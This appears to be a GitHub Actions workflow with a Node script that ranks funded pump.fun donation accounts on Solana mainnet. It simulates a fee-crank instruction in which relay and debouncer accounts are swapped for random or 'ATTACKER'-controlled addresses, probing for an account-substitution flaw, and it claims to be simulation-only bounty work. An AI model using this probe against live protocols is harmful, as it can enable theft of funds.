name: donation-crank-fast-lamports
on:
  push:
    paths:
      - '.github/workflows/donation-crank-fast-lamports.yml'
  workflow_dispatch:
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-24.04
    timeout-minutes: 8
    steps:
      - uses: actions/setup-node@v4
        with: {node-version: 24}
      - run: npm install --no-save @pump-fun/pump-sdk@1.36.0 @solana/web3.js @solana/spl-token bs58
      - name: Read-only lamport rank plus simulation-only canonical/random relay accounts
        shell: bash
        run: |
          node --input-type=module <<'NODE'
          import bs58pkg from 'bs58';const bs58=bs58pkg.default??bs58pkg;
          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction,Keypair} from '@solana/web3.js';
          import {TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,getAssociatedTokenAddressSync} from '@solana/spl-token';
          import * as p from '@pump-fun/pump-sdk';
          const FEE='pfeeUxB6jkeY1Hxd7CsFCAjcbHA9rWtchMGdZ6VojVZ',DISC=bs58.encode(Buffer.from('f6c56009c11e5d73','hex')),RPC='https://api.mainnet-beta.solana.com',ATTACKER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA'),RELAY=p.DONATION_RELAY_PROGRAM_ID_MAINNET;
          let id=1;async function rpc(m,params){const r=await fetch(RPC,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-readonly-donation-fast/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method:m,params})});if(!r.ok)throw Error('HTTP '+r.status);const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result}
          const rows=await rpc('getProgramAccounts',[FEE,{encoding:'base64',commitment:'confirmed',filters:[{memcmp:{offset:0,bytes:DISC}}],dataSlice:{offset:0,length:154}}]);console.log('COUNT',rows.length);const parsed=rows.map(r=>{const b=Buffer.from(r.account.data[0],'base64');let o=10;const config=bs58.encode(b.subarray(o,o+=32)),base=bs58.encode(b.subarray(o,o+=32)),quote=bs58.encode(b.subarray(o,o+=32)),creator=bs58.encode(b.subarray(o,o+=32));return {pda:r.pubkey,lamports:r.account.lamports,config,base,quote,creator}}).sort((a,b)=>b.lamports-a.lamports);console.log('TOP_LAMPORTS',JSON.stringify(parsed.slice(0,40),null,2));
          const rent=await rpc('getMinimumBalanceForRentExemption',[218]);console.log('RENT_218',rent);const target=parsed.find(x=>x.lamports>rent);if(!target){console.log('NO_EXCESS_LAMPORT_TARGET');process.exit(0)}
          const MINT=new PublicKey(target.base),CONFIG=new PublicKey(target.config),QUOTE=new PublicKey(target.quote),DON=new PublicKey(target.pda),conn=new Connection(RPC,'confirmed');const donationAta=getAssociatedTokenAddressSync(QUOTE,DON,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID),epoch=p.donationRelayEpochTrackerPda(CONFIG,QUOTE,RELAY),deb=p.donationRelayDebouncerPda(CONFIG,QUOTE,RELAY),debAta=getAssociatedTokenAddressSync(QUOTE,deb,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID),whitelist=p.donationRelayMintWhitelistPda(RELAY),relayEvent=p.donationRelayEventAuthorityPda(RELAY),attAta=getAssociatedTokenAddressSync(QUOTE,ATTACKER,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
          console.log('TARGET',JSON.stringify({...target,rent,excess:String(target.lamports-rent),donationAta:donationAta.toBase58(),epoch:epoch.toBase58(),debouncer:deb.toBase58(),debouncerAta:debAta.toBase58(),whitelist:whitelist.toBase58(),relayEvent:relayEvent.toBase58(),relay:RELAY.toBase58()},null,2));
          let ix;try{ix=await p.PUMP_SDK.crankDonationFeePda({payer:ATTACKER,mint:MINT,configId:CONFIG,donationRelayProgramId:RELAY,quoteMint:QUOTE})}catch(e){console.log('BUILD_FAIL',String(e));process.exit(0)}console.log('KEYS',JSON.stringify(ix.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
          function parse(logs){const t=(logs??[]).join('\n');return {account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|donat|relay|deboun|whitelist|Transfer|failed|success/i.test(x)).slice(-140)}}
          async function sim(label,inst){const {blockhash}=await conn.getLatestBlockhash('processed');const tx=new VersionedTransaction(new TransactionMessage({payerKey:ATTACKER,recentBlockhash:blockhash,instructions:[inst]}).compileToV0Message());const v=(await conn.simulateTransaction(tx,{sigVerify:false,replaceRecentBlockhash:true,commitment:'processed'})).value,e=parse(v.logs);console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,interesting:e.interesting},null,2));return {v,e}}
          function mut(oldPk,newPk){const keys=ix.keys.map(k=>({...k})),i=keys.findIndex(k=>k.pubkey.equals(oldPk));if(i<0)return null;keys[i].pubkey=newPk;return new TransactionInstruction({programId:ix.programId,keys,data:Buffer.from(ix.data)})}
          await sim('CONTROL',ix);for(const [name,a,b] of [['relay_event_random',relayEvent,Keypair.generate().publicKey],['whitelist_random',whitelist,Keypair.generate().publicKey],['epoch_random',epoch,Keypair.generate().publicKey],['debouncer_attacker',deb,ATTACKER],['debouncer_ata_attacker',debAta,attAta]]){const q=mut(a,b);if(q)await sim(name,q)}
          NODE